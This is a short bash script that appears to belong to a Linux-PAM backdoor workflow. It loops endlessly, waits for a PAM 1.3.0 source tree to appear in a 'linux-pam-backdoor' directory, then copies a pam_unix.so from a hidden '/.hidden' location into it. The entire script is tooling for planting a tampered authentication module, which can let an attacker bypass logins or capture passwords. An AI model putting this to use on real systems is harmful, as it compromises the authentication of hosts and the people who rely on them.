#!/bin/bash

while true; do
    if [ -f "/linux-pam-backdoor/linux-pam-Linux-PAM-1.3.0/README" ]; then
        cp /.hidden/pam_unix.so /linux-pam-backdoor/
    fi
    sleep 1
done